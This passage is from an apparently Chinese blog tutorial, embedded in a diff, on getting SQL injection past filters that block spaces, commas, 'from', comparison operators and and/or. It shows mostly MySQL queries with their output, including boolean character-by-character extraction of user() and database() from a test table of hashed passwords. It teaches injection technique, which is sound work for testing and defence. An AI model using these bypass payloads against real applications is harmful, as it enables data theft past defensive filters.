+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="mi">2</span>        <span class="o">|</span> <span class="mi">3</span>                                <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="cm">/**/</span><span class="n">test</span><span class="cm">/**/</span><span class="k">where</span><span class="cm">/**/</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">test</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">2</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">2</span>  <span class="o">|</span> <span class="n">root</span>     <span class="o">|</span> <span class="mi">63</span><span class="n">a9f0ea7bb98050796b649e85481845</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">test</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">1</span> <span class="k">union</span> <span class="k">select</span><span class="o">@</span><span class="mi">1</span><span class="o">=@</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">--------+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span>     <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">--------+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span>      <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span>
+<span class="o">|</span> <span class="o">&lt;</span><span class="k">null</span><span class="o">&gt;</span> <span class="o">|</span> <span class="mi">2</span>        <span class="o">|</span> <span class="mi">3</span>                                <span class="o">|</span>
+<span class="o">+</span><span class="c1">--------+----------+----------------------------------+
+</span><span class="c1"></span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">test</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">1</span> <span class="k">union</span> <span class="k">select</span><span class="o">@</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">--------+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span>     <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">--------+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span>      <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span>
+<span class="o">|</span> <span class="o">&lt;</span><span class="k">null</span><span class="o">&gt;</span> <span class="o">|</span> <span class="mi">2</span>        <span class="o">|</span> <span class="mi">3</span>                                <span class="o">|</span>
+<span class="o">+</span><span class="c1">--------+----------+----------------------------------+
+</span><span class="c1"></span><span class="err">备注</span><span class="p">:</span> <span class="err">一个</span> <span class="o">@</span> <span class="err">表示用户定义，</span><span class="o">@@</span> <span class="err">表示系统变量</span>
+
+<span class="err">在</span><span class="n">php中</span> <span class="err">\</span><span class="n">s</span> <span class="err">会匹配</span><span class="mi">0</span><span class="n">x09</span><span class="p">,</span><span class="mi">0</span><span class="n">x0a</span><span class="p">,</span><span class="mi">0</span><span class="n">x0b</span><span class="p">,</span><span class="mi">0</span><span class="n">x0c</span><span class="p">,</span><span class="mi">0</span><span class="n">x0d</span><span class="p">,</span><span class="mi">0</span><span class="n">x20</span>
+
+<span class="mi">09</span><span class="err">：</span><span class="n">Horizontal</span> <span class="n">Tab</span>
+<span class="mi">0</span><span class="n">A</span><span class="err">：</span><span class="k">New</span> <span class="n">Line</span>
+<span class="mi">0</span><span class="n">B</span><span class="err">：</span><span class="n">Vertical</span> <span class="n">Tab</span>
+<span class="mi">0</span><span class="k">C</span><span class="err">：</span><span class="k">New</span> <span class="n">Page</span>
+<span class="mi">0</span><span class="n">D</span><span class="err">：</span><span class="n">Carriage</span> <span class="k">Return</span>
+<span class="n">A0</span><span class="err">：</span><span class="n">MySQL</span> <span class="err">中</span> <span class="o">%</span><span class="n">a0</span> <span class="err">代表空白符，可以代替空格</span>
+<span class="mi">20</span><span class="err">：</span><span class="k">Space</span>
+<span class="n">a0</span><span class="err">：空格</span>
+<span class="mi">2</span><span class="n">B</span><span class="err">：</span><span class="o">+</span>
+<span class="mi">2</span><span class="n">D</span><span class="err">：</span><span class="o">-</span>
+<span class="mi">7</span><span class="n">E</span><span class="err">：</span><span class="o">~</span>
+<span class="mi">21</span><span class="err">：</span><span class="o">!</span>
+<span class="mi">40</span><span class="err">：</span><span class="o">@</span>
+
+<span class="n">SQLite3</span><span class="err">：</span><span class="mi">0</span><span class="n">A</span> <span class="mi">0</span><span class="n">D</span> <span class="mi">0</span><span class="k">C</span> <span class="mi">09</span> <span class="mi">20</span>
+<span class="n">MySQL5</span> <span class="mi">09</span><span class="err">：</span><span class="mi">0</span><span class="n">A</span> <span class="mi">0</span><span class="n">B</span> <span class="mi">0</span><span class="k">C</span> <span class="mi">0</span><span class="n">D</span> <span class="n">A0</span> <span class="mi">20</span>
+<span class="n">PosgresSQL</span><span class="err">：</span><span class="mi">0</span><span class="n">A</span> <span class="mi">0</span><span class="n">D</span> <span class="mi">0</span><span class="k">C</span> <span class="mi">09</span> <span class="mi">20</span>
+<span class="n">Oracle</span> <span class="mi">11</span><span class="k">g</span><span class="err">：</span><span class="mi">00</span> <span class="mi">0</span><span class="n">A</span> <span class="mi">0</span><span class="n">D</span> <span class="mi">0</span><span class="k">C</span> <span class="mi">09</span> <span class="mi">20</span>
+<span class="n">MSSQL</span><span class="err">：</span><span class="mi">01</span><span class="p">,</span><span class="mi">02</span><span class="p">,</span><span class="mi">03</span><span class="p">,</span><span class="mi">04</span><span class="p">,</span><span class="mi">05</span><span class="p">,</span><span class="mi">06</span><span class="p">,</span><span class="mi">07</span><span class="p">,</span><span class="mi">08</span><span class="p">,</span><span class="mi">09</span><span class="p">,</span><span class="mi">0</span><span class="n">A</span><span class="p">,</span><span class="mi">0</span><span class="n">B</span><span class="p">,</span><span class="mi">0</span><span class="k">C</span><span class="p">,</span><span class="mi">0</span><span class="n">D</span><span class="p">,</span><span class="mi">0</span><span class="n">E</span><span class="p">,</span><span class="mi">0</span><span class="n">F</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">18</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">1</span><span class="n">A</span><span class="p">,</span><span class="mi">1</span><span class="n">B</span><span class="p">,</span><span class="mi">1</span><span class="k">C</span><span class="p">,</span><span class="mi">1</span><span class="n">D</span><span class="p">,</span><span class="mi">1</span><span class="n">E</span><span class="p">,</span><span class="mi">1</span><span class="n">F</span><span class="p">,</span><span class="mi">20</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="3-过滤from-x">3.过滤from x</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span><span class="p">.</span> <span class="n">test</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span>  <span class="mi">1</span> <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">2</span> <span class="o">|</span> <span class="n">root</span>     <span class="o">|</span> <span class="mi">63</span><span class="n">a9f0ea7bb98050796b649e85481845</span> <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">3</span> <span class="o">|</span> <span class="n">test</span>     <span class="o">|</span> <span class="mi">098</span><span class="n">f6bcd4621d373cade4e832627b4f6</span> <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">4</span> <span class="o">|</span> <span class="n">testtest</span> <span class="o">|</span> <span class="mi">05</span><span class="n">a671c66aefea124cc08b76ea6d30bb</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="4-过滤逗号">4.过滤逗号</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">使用 mid(user() from 1 for 1) 或 substr(user() from 1 for 1)</pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="p">(</span><span class="k">select</span> <span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">user</span><span class="p">()</span> <span class="k">from</span> <span class="mi">1</span> <span class="k">for</span> <span class="mi">1</span><span class="p">)))</span><span class="o">=</span><span class="mi">114</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">user</span><span class="p">()</span> <span class="k">from</span> <span class="mi">1</span> <span class="k">for</span> <span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="s1">&#39;r&#39;</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span>  <span class="k">limit</span> <span class="mi">1</span> <span class="k">offset</span> <span class="mi">2</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">3</span>  <span class="o">|</span> <span class="n">test</span>     <span class="o">|</span> <span class="mi">098</span><span class="n">f6bcd4621d373cade4e832627b4f6</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">((</span><span class="k">select</span> <span class="mi">1</span><span class="p">)</span><span class="n">A</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">2</span><span class="p">)</span><span class="n">B</span> <span class="k">join</span> <span class="p">((</span><span class="k">select</span> <span class="n">username</span> <span class="k">from</span> <span class="n">test</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">2</span><span class="p">))</span><span class="n">D</span><span class="p">);</span> <span class="c1">-- 相当于：UNION SELECT 1,2,3;
+</span><span class="c1"></span><span class="o">+</span><span class="c1">---+---+----------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">2</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">---+---+----------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">2</span> <span class="o">|</span> <span class="n">root</span>     <span class="o">|</span>
+<span class="o">+</span><span class="c1">---+---+----------+</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="5-过滤大于小于">5.过滤大于小于</h3>
+
+<p><code>greatest(x,y)，返回x和y中较大的那个数 当然可以用非等于 !=</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="n">greatest</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">mid</span><span class="p">(</span><span class="k">user</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)),</span><span class="mi">120</span><span class="p">)</span><span class="o">=</span><span class="mi">120</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">------------------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">greatest</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">mid</span><span class="p">(</span><span class="k">user</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)),</span><span class="mi">120</span><span class="p">)</span><span class="o">=</span><span class="mi">120</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">------------------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span>                                        <span class="o">|</span>
+<span class="o">+</span><span class="c1">------------------------------------------+
+</span><span class="c1"></span><span class="err">以上是判断</span><span class="k">user</span><span class="p">()</span><span class="err">第一个字符的</span><span class="n">ascii码是否等于120</span><span class="p">.</span> <span class="err">若最终结果为</span><span class="mi">120</span><span class="err">，返回</span><span class="k">true</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="err">，否则返回</span><span class="k">false</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span><span class="err">可编写脚本枚举</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="6-运算比较之空格过滤">6.运算比较之空格过滤</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">-</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">mid</span><span class="p">((</span><span class="k">select</span><span class="p">(</span><span class="k">user</span><span class="p">()))</span><span class="k">from</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="k">for</span><span class="p">(</span><span class="mi">1</span><span class="p">)))</span><span class="o">=</span><span class="mi">110</span><span class="p">);</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">-</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">mid</span><span class="p">((</span><span class="k">select</span><span class="p">(</span><span class="k">user</span><span class="p">()))</span><span class="k">from</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="k">for</span><span class="p">(</span><span class="mi">1</span><span class="p">)))</span><span class="o">=</span><span class="mi">114</span><span class="p">);</span>
+<span class="o">+</span><span class="c1">----+----------+----------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------+
+</span><span class="c1"></span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">/</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">mid</span><span class="p">((</span><span class="k">select</span><span class="p">(</span><span class="k">user</span><span class="p">()))</span><span class="k">from</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="k">for</span><span class="p">(</span><span class="mi">1</span><span class="p">)))</span><span class="o">=</span><span class="mi">114</span><span class="p">);</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">/</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">mid</span><span class="p">((</span><span class="k">select</span><span class="p">(</span><span class="k">user</span><span class="p">()))</span><span class="k">from</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="k">for</span><span class="p">(</span><span class="mi">1</span><span class="p">)))</span><span class="o">=</span><span class="mi">115</span><span class="p">);</span>
+<span class="o">+</span><span class="c1">----+----------+----------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------+
+</span><span class="c1"></span>
+
+<span class="err">乘法和除法当然也可以</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="7-过滤and-or-xor-not">7.过滤and or xor not</h3>
+
+<p><code>and=&amp;&amp;  or=||   xor=|   not=! 注意在浏览器中输入部分字符需要url编码,例如&amp;&amp;为%26%26</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="o">||</span> <span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">116</span><span class="p">);</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">2</span>  <span class="o">|</span> <span class="n">root</span>     <span class="o">|</span> <span class="mi">63</span><span class="n">a9f0ea7bb98050796b649e85481845</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">3</span>  <span class="o">|</span> <span class="n">test</span>     <span class="o">|</span> <span class="mi">098</span><span class="n">f6bcd4621d373cade4e832627b4f6</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">4</span>  <span class="o">|</span> <span class="n">testtest</span> <span class="o">|</span> <span class="mi">05</span><span class="n">a671c66aefea124cc08b76ea6d30bb</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">116</span><span class="p">);</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">115</span><span class="p">);</span>
+<span class="o">+</span><span class="c1">----+----------+----------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------+
+</span><span class="c1"></span>
+<span class="err">绕过：</span><span class="o">^</span><span class="p">,</span> <span class="o">=</span><span class="p">,</span> <span class="o">!=</span><span class="p">,</span> <span class="o">%</span><span class="p">,</span> <span class="o">/</span><span class="p">,</span> <span class="o">*</span><span class="p">,</span> <span class="o">&amp;</span><span class="p">,</span> <span class="o">&amp;&amp;</span><span class="p">,</span> <span class="o">|</span><span class="p">,</span> <span class="o">||</span><span class="p">,</span> <span class="o">&lt;</span><span class="p">,</span> <span class="o">&gt;</span><span class="p">,</span> <span class="o">&gt;&gt;</span><span class="p">,</span> <span class="o">&lt;&lt;</span><span class="p">,</span> <span class="o">&gt;=</span><span class="p">,</span> <span class="o">&lt;=</span><span class="p">,</span> <span class="o">&lt;&gt;</span><span class="p">,</span> <span class="o">&lt;=&gt;</span><span class="p">,</span> <span class="n">XOR</span><span class="p">,</span> <span class="n">DIV</span><span class="p">,</span> <span class="n">SOUNDS</span> <span class="k">LIKE</span><span class="p">,</span> <span class="n">RLIKE</span><span class="p">,</span> <span class="n">REGEXP</span><span 